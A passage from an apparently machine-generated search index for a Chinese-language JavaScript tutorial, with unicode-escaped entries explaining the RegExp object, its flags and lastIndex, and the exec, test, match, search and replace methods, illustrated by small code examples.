\u524d\u9762\u6240\u4ee5\u88ab\u5339\u914d\uff0c\u800c\u4e14\u62ec\u53f7\u5bf9\u5e94\u7684 d \u4e0d\u4f1a\u88ab\u8fd4\u56de\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Axel Rauschmayer, JavaScript: an overview of the regular expression API Mozilla Developer Network, Regular Expressions Axel Rauschmayer, The flag /g of JavaScript\u2019s regular expressions Sam Hughes, Learn regular expressions in about 55 minutes","title":"RegExp \u5bf9\u8c61"},{"location":"stdlib/regexp/#regexp","text":"RegExp \u5bf9\u8c61\u63d0\u4f9b\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u529f\u80fd\u3002","title":"RegExp \u5bf9\u8c61"},{"location":"stdlib/regexp/#_1","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\uff08regular expression\uff09\u662f\u4e00\u79cd\u8868\u8fbe\u6587\u672c\u6a21\u5f0f\uff08\u5373\u5b57\u7b26\u4e32\u7ed3\u6784\uff09\u7684\u65b9\u6cd5\uff0c\u6709\u70b9\u50cf\u5b57\u7b26\u4e32\u7684\u6a21\u677f\uff0c\u5e38\u5e38\u7528\u6765\u6309\u7167\u201c\u7ed9\u5b9a\u6a21\u5f0f\u201d\u5339\u914d\u6587\u672c\u3002\u6bd4\u5982\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u7ed9\u51fa\u4e00\u4e2a Email \u5730\u5740\u7684\u6a21\u5f0f\uff0c\u7136\u540e\u7528\u5b83\u6765\u786e\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u4e3a Email \u5730\u5740\u3002JavaScript \u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4f53\u7cfb\u662f\u53c2\u7167 Perl 5 \u5efa\u7acb\u7684\u3002 \u65b0\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u4e24\u79cd\u65b9\u6cd5\u3002\u4e00\u79cd\u662f\u4f7f\u7528\u5b57\u9762\u91cf\uff0c\u4ee5\u659c\u6760\u8868\u793a\u5f00\u59cb\u548c\u7ed3\u675f\u3002 1 var regex = /xyz/ ; \u53e6\u4e00\u79cd\u662f\u4f7f\u7528 RegExp \u6784\u9020\u51fd\u6570\u3002 1 var regex = new RegExp ( 'xyz' ); \u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\u662f\u7b49\u4ef7\u7684\uff0c\u90fd\u65b0\u5efa\u4e86\u4e00\u4e2a\u5185\u5bb9\u4e3a xyz \u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u8c61\u3002\u5b83\u4eec\u7684\u4e3b\u8981\u533a\u522b\u662f\uff0c\u7b2c\u4e00\u79cd\u65b9\u6cd5\u5728\u5f15\u64ce\u7f16\u8bd1\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u65b0\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u5728\u8fd0\u884c\u65f6\u65b0\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u524d\u8005\u7684\u6548\u7387\u8f83\u9ad8\u3002\u800c\u4e14\uff0c\u524d\u8005\u6bd4\u8f83\u4fbf\u5229\u548c\u76f4\u89c2\uff0c\u6240\u4ee5\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u57fa\u672c\u4e0a\u90fd\u91c7\u7528\u5b57\u9762\u91cf\u5b9a\u4e49\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 RegExp \u6784\u9020\u51fd\u6570\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u4fee\u9970\u7b26\uff08\u8be6\u7ec6\u89e3\u91ca\u89c1\u4e0b\u6587\uff09\u3002 1 2 3 var regex = new RegExp ( 'xyz' , 'i' ); // \u7b49\u4ef7\u4e8e var regex = /xyz/i ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f /xyz/ \u6709\u4e00\u4e2a\u4fee\u9970\u7b26 i \u3002","title":"\u6982\u8ff0"},{"location":"stdlib/regexp/#_2","text":"\u6b63\u5219\u5bf9\u8c61\u7684\u5b9e\u4f8b\u5c5e\u6027\u5206\u6210\u4e24\u7c7b\u3002 \u4e00\u7c7b\u662f\u4fee\u9970\u7b26\u76f8\u5173\uff0c\u7528\u4e8e\u4e86\u89e3\u8bbe\u7f6e\u4e86\u4ec0\u4e48\u4fee\u9970\u7b26\u3002 RegExp.prototype.ignoreCase \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 i \u4fee\u9970\u7b26\u3002 RegExp.prototype.global \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 g \u4fee\u9970\u7b26\u3002 RegExp.prototype.multiline \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 m \u4fee\u9970\u7b26\u3002 RegExp.prototype.flags \uff1a\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5305\u542b\u4e86\u5df2\u7ecf\u8bbe\u7f6e\u7684\u6240\u6709\u4fee\u9970\u7b26\uff0c\u6309\u5b57\u6bcd\u6392\u5e8f\u3002 \u4e0a\u9762\u56db\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u7684\u3002 1 2 3 4 5 6 var r = /abc/igm ; r . ignoreCase // true r . global // true r . multiline // true r . flags // 'gim' \u53e6\u4e00\u7c7b\u662f\u4e0e\u4fee\u9970\u7b26\u65e0\u5173\u7684\u5c5e\u6027\uff0c\u4e3b\u8981\u662f\u4e0b\u9762\u4e24\u4e2a\u3002 RegExp.prototype.lastIndex \uff1a\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u4e0b\u4e00\u6b21\u5f00\u59cb\u641c\u7d22\u7684\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4f46\u662f\u53ea\u5728\u8fdb\u884c\u8fde\u7eed\u641c\u7d22\u65f6\u6709\u610f\u4e49\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\u540e\u6587\u3002 RegExp.prototype.source \uff1a\u8fd4\u56de\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff08\u4e0d\u5305\u62ec\u53cd\u659c\u6760\uff09\uff0c\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 3 4 var r = /abc/igm ; r . lastIndex // 0 r . source // \"abc\"","title":"\u5b9e\u4f8b\u5c5e\u6027"},{"location":"stdlib/regexp/#_3","text":"","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"stdlib/regexp/#regexpprototypetest","text":"\u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u7684 test \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u6a21\u5f0f\u662f\u5426\u80fd\u5339\u914d\u53c2\u6570\u5b57\u7b26\u4e32\u3002 1 /cat/ . test ( 'cats and dogs' ) // true \u4e0a\u9762\u4ee3\u7801\u9a8c\u8bc1\u53c2\u6570\u5b57\u7b26\u4e32\u4e4b\u4e2d\u662f\u5426\u5305\u542b cat \uff0c\u7ed3\u679c\u8fd4\u56de true \u3002 \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f\u5e26\u6709 g \u4fee\u9970\u7b26\uff0c\u5219\u6bcf\u4e00\u6b21 test \u65b9\u6cd5\u90fd\u4ece\u4e0a\u4e00\u6b21\u7ed3\u675f\u7684\u4f4d\u7f6e\u5f00\u59cb\u5411\u540e\u5339\u914d\u3002 1 2 3 4 5 6 7 8 9 10 11 var r = /x/g ; var s = '_x_x' ; r . lastIndex // 0 r . test ( s ) // true r . lastIndex // 2 r . test ( s ) // true r . lastIndex // 4 r . test ( s ) // false \u4e0a\u9762\u4ee3\u7801\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u4e86 g \u4fee\u9970\u7b26\uff0c\u8868\u793a\u662f\u5168\u5c40\u641c\u7d22\uff0c\u4f1a\u6709\u591a\u4e2a\u7ed3\u679c\u3002\u63a5\u7740\uff0c\u4e09\u6b21\u4f7f\u7528 test \u65b9\u6cd5\uff0c\u6bcf\u4e00\u6b21\u5f00\u59cb\u641c\u7d22\u7684\u4f4d\u7f6e\u90fd\u662f\u4e0a\u4e00\u6b21\u5339\u914d\u7684\u540e\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u5e26\u6709 g \u4fee\u9970\u7b26\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6b63\u5219\u5bf9\u8c61\u7684 lastIndex \u5c5e\u6027\u6307\u5b9a\u5f00\u59cb\u641c\u7d22\u7684\u4f4d\u7f6e\u3002 1 2 3 4 5 6 7 8 var r = /x/g ; var s = '_x_x' ; r . lastIndex = 4 ; r . test ( s ) // false r . lastIndex // 0 r . test ( s ) \u4e0a\u9762\u4ee3\u7801\u6307\u5b9a\u4ece\u5b57\u7b26\u4e32\u7684\u7b2c\u4e94\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u641c\u7d22\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u4e3a\u7a7a\uff0c\u6240\u4ee5\u8fd4\u56de false \u3002\u540c\u65f6\uff0c lastIndex \u5c5e\u6027\u91cd\u7f6e\u4e3a 0 \uff0c\u6240\u4ee5\u7b2c\u4e8c\u6b21\u6267\u884c r.test(s) \u4f1a\u8fd4\u56de true \u3002 \u6ce8\u610f\uff0c\u5e26\u6709 g \u4fee\u9970\u7b26\u65f6\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u5185\u90e8\u4f1a\u8bb0\u4f4f\u4e0a\u4e00\u6b21\u7684 lastIndex \u5c5e\u6027\uff0c\u8fd9\u65f6\u4e0d\u5e94\u8be5\u66f4\u6362\u6240\u8981\u5339\u914d\u7684\u5b57\u7b26\u4e32\uff0c\u5426\u5219\u4f1a\u6709\u4e00\u4e9b\u96be\u4ee5\u5bdf\u89c9\u7684\u9519\u8bef\u3002 1 2 3 var r = /bb/g ; r . test ( 'bb' ) // true r . test ( '-bb-' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f r \u662f\u4ece\u4e0a\u4e00\u6b21\u7684 lastIndex \u4f4d\u7f6e\u5f00\u59cb\u5339\u914d\uff0c\u5bfc\u81f4\u7b2c\u4e8c\u6b21\u6267\u884c test \u65b9\u6cd5\u65f6\u51fa\u73b0\u9884\u671f\u4ee5\u5916\u7684\u7ed3\u679c\u3002 lastIndex \u5c5e\u6027\u53ea\u5bf9\u540c\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u6548\uff0c\u6240\u4ee5\u4e0b\u9762\u8fd9\u6837\u5199\u662f\u9519\u8bef\u7684\u3002 1 2 var count = 0 ; while ( /a/g . test ( 'babaa' )) count ++ ; \u4e0a\u9762\u4ee3\u7801\u4f1a\u5bfc\u81f4\u65e0\u9650\u5faa\u73af\uff0c\u56e0\u4e3a while \u5faa\u73af\u7684\u6bcf\u6b21\u5339\u914d\u6761\u4ef6\u90fd\u662f\u4e00\u4e2a\u65b0\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5bfc\u81f4 lastIndex \u5c5e\u6027\u603b\u662f\u7b49\u4e8e0\u3002 \u5982\u679c\u6b63\u5219\u6a21\u5f0f\u662f\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u5339\u914d\u6240\u6709\u5b57\u7b26\u4e32\u3002 1 2 new RegExp ( '' ). test ( 'abc' ) // true","title":"RegExp.prototype.test()"},{"location":"stdlib/regexp/#regexpprototypeexec","text":"\u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u7684 exec() \u65b9\u6cd5\uff0c\u7528\u6765\u8fd4\u56de\u5339\u914d\u7ed3\u679c\u3002\u5982\u679c\u53d1\u73b0\u5339\u914d\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u5339\u914d\u6210\u529f\u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u5426\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 var s = '_x_x' ; var r1 = /x/ ; var r2 = /y/ ; r1 . exec ( s ) // [\"x\"] r2 . exec ( s ) // null \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u5bf9\u8c61 r1 \u5339\u914d\u6210\u529f\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u5339\u914d\u7ed3\u679c\uff1b\u6b63\u5219\u5bf9\u8c61 r2 \u5339\u914d\u5931\u8d25\uff0c\u8fd4\u56de null \u3002 \u5982\u679c\u6b63\u5219\u8868\u793a\u5f0f\u5305\u542b\u5706\u62ec\u53f7\uff08\u5373\u542b\u6709\u201c\u7ec4\u5339\u914d\u201d\uff09\uff0c\u5219\u8fd4\u56de\u7684\u6570\u7ec4\u4f1a\u5305\u62ec\u591a\u4e2a\u6210\u5458\u3002\u7b2c\u4e00\u4e2a\u6210\u5458\u662f\u6574\u4e2a\u5339\u914d\u6210\u529f\u7684\u7ed3\u679c\uff0c\u540e\u9762\u7684\u6210\u5458\u5c31\u662f\u5706\u62ec\u53f7\u5bf9\u5e94\u7684\u5339\u914d\u6210\u529f\u7684\u7ec4\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7b2c\u4e8c\u4e2a\u6210\u5458\u5bf9\u5e94\u7b2c\u4e00\u4e2a\u62ec\u53f7\uff0c\u7b2c\u4e09\u4e2a\u6210\u5458\u5bf9\u5e94\u7b2c\u4e8c\u4e2a\u62ec\u53f7\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u6574\u4e2a\u6570\u7ec4\u7684 length \u5c5e\u6027\u7b49\u4e8e\u7ec4\u5339\u914d\u7684\u6570\u91cf\u518d\u52a01\u3002 1 2 3 4 var s = '_x_x' ; var r = /_(x)/ ; r . exec ( s ) // [\"_x\", \"x\"] \u4e0a\u9762\u4ee3\u7801\u7684 exec() \u65b9\u6cd5\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\u3002\u7b2c\u4e00\u4e2a\u6210\u5458\u662f\u6574\u4e2a\u5339\u914d\u7684\u7ed3\u679c\uff0c\u7b2c\u4e8c\u4e2a\u6210\u5458\u662f\u5706\u62ec\u53f7\u5339\u914d\u7684\u7ed3\u679c\u3002 exec() \u65b9\u6cd5\u7684\u8fd4\u56de\u6570\u7ec4\u8fd8\u5305\u542b\u4ee5\u4e0b\u4e24\u4e2a\u5c5e\u6027\uff1a input \uff1a\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u3002 index \uff1a\u6a21\u5f0f\u5339\u914d\u6210\u529f\u7684\u5f00\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\u8ba1\u6570\uff09\u3002 1 2 3 4 5 6 7 var r = /a(b+)a/ ; var arr = r . exec ( '_abbba_aba_' ); arr // [\"abbba\", \"bbb\"] arr . index // 1 arr . input // \"_abbba_aba_\" \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684 index \u5c5e\u6027\u7b49\u4e8e1\uff0c\u662f\u56e0\u4e3a\u4ece\u539f\u5b57\u7b26\u4e32\u7684\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u5339\u914d\u6210\u529f\u3002 \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f\u52a0\u4e0a g \u4fee\u9970\u7b26\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u591a\u6b21 exec() \u65b9\u6cd5\uff0c\u4e0b\u4e00\u6b21\u641c\u7d22\u7684\u4f4d\u7f6e\u4ece\u4e0a\u4e00\u6b21\u5339\u914d\u6210\u529f\u7ed3\u675f\u7684\u4f4d\u7f6e\u5f00\u59cb\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var reg = /a/g ; var str = 'abc_abc_abc' var r1 = reg . exec ( str ); r1 // [\"a\"] r1 . index // 0 reg . lastIndex // 1 var r2 = reg . exec ( str ); r2 // [\"a\"] r2 . index // 4 reg . lastIndex // 5 var r3 = reg . exec ( str ); r3 // [\"a\"] r3 . index // 8 reg . lastIndex // 9 var r4 = reg . exec ( str ); r4 // null reg . lastIndex // 0 \u4e0a\u9762\u4ee3\u7801\u8fde\u7eed\u7528\u4e86\u56db\u6b21 exec() \u65b9\u6cd5\uff0c\u524d\u4e09\u6b21\u90fd\u662f\u4ece\u4e0a\u4e00\u6b21\u5339\u914d\u7ed3\u675f\u7684\u4f4d\u7f6e\u5411\u540e\u5339\u914d\u3002\u5f53\u7b2c\u4e09\u6b21\u5339\u914d\u7ed3\u675f\u4ee5\u540e\uff0c\u6574\u4e2a\u5b57\u7b26\u4e32\u5df2\u7ecf\u5230\u8fbe\u5c3e\u90e8\uff0c\u5339\u914d\u7ed3\u679c\u8fd4\u56de null \uff0c\u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u7684 lastIndex \u5c5e\u6027\u4e5f\u91cd\u7f6e\u4e3a 0 \uff0c\u610f\u5473\u7740\u7b2c\u56db\u6b21\u5339\u914d\u5c06\u4ece\u5934\u5f00\u59cb\u3002 \u5229\u7528 g \u4fee\u9970\u7b26\u5141\u8bb8\u591a\u6b21\u5339\u914d\u7684\u7279\u70b9\uff0c\u53ef\u4ee5\u7528\u4e00\u4e2a\u5faa\u73af\u5b8c\u6210\u5168\u90e8\u5339\u914d\u3002 1 2 3 4 5 6 7 8 9 10 11 var reg = /a/g ; var str = 'abc_abc_abc' while ( true ) { var match = reg . exec ( str ); if ( ! match ) break ; console . log ( '#' + match . index + ':' + match [ 0 ]); } // #0:a // #4:a // #8:a \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u8981 exec() \u65b9\u6cd5\u4e0d\u8fd4\u56de null \uff0c\u5c31\u4f1a\u4e00\u76f4\u5faa\u73af\u4e0b\u53bb\uff0c\u6bcf\u6b21\u8f93\u51fa\u5339\u914d\u7684\u4f4d\u7f6e\u548c\u5339\u914d\u7684\u6587\u672c\u3002 \u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u7684 lastIndex \u5c5e\u6027\u4e0d\u4ec5\u53ef\u8bfb\uff0c\u8fd8\u53ef\u5199\u3002\u8bbe\u7f6e\u4e86 g \u4fee\u9970\u7b26\u7684\u65f6\u5019\uff0c\u53ea\u8981\u624b\u52a8\u8bbe\u7f6e\u4e86 lastIndex \u7684\u503c\uff0c\u5c31\u4f1a\u4ece\u6307\u5b9a\u4f4d\u7f6e\u5f00\u59cb\u5339\u914d\u3002","title":"RegExp.prototype.exec()"},{"location":"stdlib/regexp/#_4","text":"\u5b57\u7b26\u4e32\u7684\u5b9e\u4f8b\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u67094\u79cd\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u5173\u3002 String.prototype.match() \uff1a\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u6240\u6709\u5339\u914d\u7684\u5b50\u5b57\u7b26\u4e32\u3002 String.prototype.search() \uff1a\u6309\u7167\u7ed9\u5b9a\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u641c\u7d22\uff0c\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5339\u914d\u5f00\u59cb\u7684\u4f4d\u7f6e\u3002 String.prototype.replace() \uff1a\u6309\u7167\u7ed9\u5b9a\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u66ff\u6362\uff0c\u8fd4\u56de\u66ff\u6362\u540e\u7684\u5b57\u7b26\u4e32\u3002 String.prototype.split() \uff1a\u6309\u7167\u7ed9\u5b9a\u89c4\u5219\u8fdb\u884c\u5b57\u7b26\u4e32\u5206\u5272\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u5206\u5272\u540e\u7684\u5404\u4e2a\u6210\u5458\u3002","title":"\u5b57\u7b26\u4e32\u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"stdlib/regexp/#stringprototypematch","text":"\u5b57\u7b26\u4e32\u5b9e\u4f8b\u5bf9\u8c61\u7684 match \u65b9\u6cd5\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u6b63\u5219\u5339\u914d\uff0c\u8fd4\u56de\u5339\u914d\u7ed3\u679c\u3002 1 2 3 4 5 6 var s = '_x_x' ; var r1 = /x/ ; var r2 = /y/ ; s . match ( r1 ) // [\"x\"] s . match ( r2 ) // null \u4ece\u4e0a\u9762\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\uff0c\u5b57\u7b26\u4e32\u7684 match \u65b9\u6cd5\u4e0e\u6b63\u5219\u5bf9\u8c61\u7684 exec \u65b9\u6cd5\u975e\u5e38\u7c7b\u4f3c\uff1a\u5339\u914d\u6210\u529f\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5339\u914d\u5931\u8d25\u8fd4\u56de null \u3002 \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f\u5e26\u6709 g \u4fee\u9970\u7b26\uff0c\u5219\u8be5\u65b9\u6cd5\u4e0e\u6b63\u5219\u5bf9\u8c61\u7684 exec \u65b9\u6cd5\u884c\u4e3a\u4e0d\u540c\uff0c\u4f1a\u4e00\u6b21\u6027\u8fd4\u56de\u6240\u6709\u5339\u914d\u6210\u529f\u7684\u7ed3\u679c\u3002 1 2 3 4 5 var s = 'abba' ; var r = /a/g ; s . match ( r ) // [\"a\", \"a\"] r . exec ( s ) // [\"a\"] \u8bbe\u7f6e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684 lastIndex \u5c5e\u6027\uff0c\u5bf9 match \u65b9\u6cd5\u65e0\u6548\uff0c\u5339\u914d\u603b\u662f\u4ece\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5f00\u59cb\u3002 1 2 3 4 var r = /a|b/g ; r . lastIndex = 7 ; 'xaxb' . match ( r ) // ['a', 'b'] r . lastIndex // 0 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u8bbe\u7f6e\u6b63\u5219\u5bf9\u8c61\u7684 lastIndex \u5c5e\u6027\u662f\u65e0\u6548\u7684\u3002","title":"String.prototype.match()"},{"location":"stdlib/regexp/#stringprototypesearch","text":"\u5b57\u7b26\u4e32\u5bf9\u8c61\u7684 search \u65b9\u6cd5\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u5339\u914d\u7ed3\u679c\u5728\u6574\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5339\u914d\uff0c\u5219\u8fd4\u56de -1 \u3002 1 2 '_x_x' . search ( /x/ ) // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u5339\u914d\u7ed3\u679c\u51fa\u73b0\u5728\u5b57\u7b26\u4e32\u7684 1 \u53f7\u4f4d\u7f6e\u3002","title":"String.prototype.search()"},{"location":"stdlib/regexp/#stringprototypereplace","text":"\u5b57\u7b26\u4e32\u5bf9\u8c61\u7684 replace \u65b9\u6cd5\u53ef\u4ee5\u66ff\u6362\u5339\u914d\u7684\u503c\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u641c\u7d22\u6a21\u5f0f\uff0c\u7b2c\u4e8c\u4e2a\u662f\u66ff\u6362\u7684\u5185\u5bb9\u3002 1 str . replace ( search , replacement ) \u6b63\u5219\u8868\u8fbe\u5f0f\u5982\u679c\u4e0d\u52a0 g \u4fee\u9970\u7b26\uff0c\u5c31\u66ff\u6362\u7b2c\u4e00\u4e2a\u5339\u914d\u6210\u529f\u7684\u503c\uff0c\u5426\u5219\u66ff\u6362\u6240\u6709\u5339\u914d\u6210\u529f\u7684\u503c\u3002 1 2 3 'aaa' . replace ( 'a' , 'b' ) // \"baa\" 'aaa' . replace ( /a/ , 'b' ) // \"baa\" 'aaa' . replace ( /a/g , 'b' ) // \"bbb\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6700\u540e\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u4e86 g \u4fee\u9970\u7b26\uff0c\u5bfc\u81f4\u6240\u6709\u7684 a \u90fd\u88ab\u66ff\u6362\u6389\u4e86\u3002 replace \u65b9\u6cd5\u7684\u4e00\u4e2a\u5e94\u7528\uff0c\u5c31\u662f\u6d88\u9664\u5b57\u7b26\u4e32\u9996\u5c3e\u4e24\u7aef\u7684\u7a7a\u683c\u3002 1 2 3 4 var str = ' #id div.class ' ; str . replace ( /^\\s+|\\s+$/g , '' ) // \"#id div.class\" replace \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u4f7f\u7528\u7f8e\u5143\u7b26\u53f7 $ \uff0c\u7528\u6765\u6307\u4ee3\u6240\u66ff\u6362\u7684\u5185\u5bb9\u3002 $& \uff1a\u5339\u914d\u7684\u5b50\u5b57\u7b26\u4e32\u3002 $` \uff1a\u5339\u914d\u7ed3\u679c\u524d\u9762\u7684\u6587\u672c\u3002 $' \uff1a\u5339\u914d\u7ed3\u679c\u540e\u9762\u7684\u6587\u672c\u3002 $n \uff1a\u5339\u914d\u6210\u529f\u7684\u7b2c n \u7ec4\u5185\u5bb9\uff0c n \u662f\u4ece1\u5f00\u59cb\u7684\u81ea\u7136\u6570\u3002 $$ \uff1a\u6307\u4ee3\u7f8e\u5143\u7b26\u53f7 $ \u3002 1 2 3 4 5 'hello world' . replace ( /(\\w+)\\s(\\w+)/ , '$2 $1' ) // \"world hello\" 'abc' . replace ( 'b' , '[$`-$&-$\\']' ) // \"a[a-b-c]c\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u4f8b\u5b50\u662f\u5c06\u5339\u914d\u7684\u7ec4\u4e92\u6362\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u662f\u6539\u5199\u5339\u914d\u7684\u503c\u3002 replace \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8fd8\u53ef\u4ee5\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06\u6bcf\u4e00\u4e2a\u5339\u914d\u5185\u5bb9\u66ff\u6362\u4e3a\u51fd\u6570\u8fd4\u56de\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 '3 and 5' . replace ( /[0-9]+/g , function ( match ) { return 2 * match ; }) // \"6 and 10\" var a = 'The quick brown fox jumped over the lazy dog.' ; var pattern = /quick|brown|lazy/ig ; a . replace ( pattern , function replacer ( match ) { return match . toUpperCase (); }); // The QUICK BROWN fox jumped over the LAZY dog. \u4f5c\u4e3a replace \u65b9\u6cd5\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u66ff\u6362\u51fd\u6570\uff0c\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u53c2\u6570\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6355\u6349\u5230\u7684\u5185\u5bb9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6355\u6349\u5230\u7684\u7ec4\u5339\u914d\uff08\u6709\u591a\u5c11\u4e2a\u7ec4\u5339\u914d\uff0c\u5c31\u6709\u591a\u5c11\u4e2a\u5bf9\u5e94\u7684\u53c2\u6570\uff09\u3002\u6b64\u5916\uff0c\u6700\u540e\u8fd8\u53ef\u4ee5\u6dfb\u52a0\u4e24\u4e2a\u53c2\u6570\uff0c\u5012\u6570\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6355\u6349\u5230\u7684\u5185\u5bb9\u5728\u6574\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e\uff08\u6bd4\u5982\u4ece\u7b2c\u4e94\u4e2a\u4f4d\u7f6e\u5f00\u59cb\uff09\uff0c\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u662f\u539f\u5b57\u7b26\u4e32\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u7f51\u9875\u6a21\u677f\u66ff\u6362\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var prices = { 'p1' : '$1.99' , 'p2' : '$9.99' , 'p3' : '$5.00' }; var template = '<span id=\"p1\"></span>' + '<span id=\"p2\"></span>' + '<span id=\"p3\"></span>' ; template . replace ( /(<span id=\")(.*?)(\">)(<\\/span>)/g , function ( match , $1 , $2 , $3 , $4 ){ return $1 + $2 + $3 + prices [ $2 ] + $4 ; } ); // \"<span id=\"p1\">$1.99</span><span 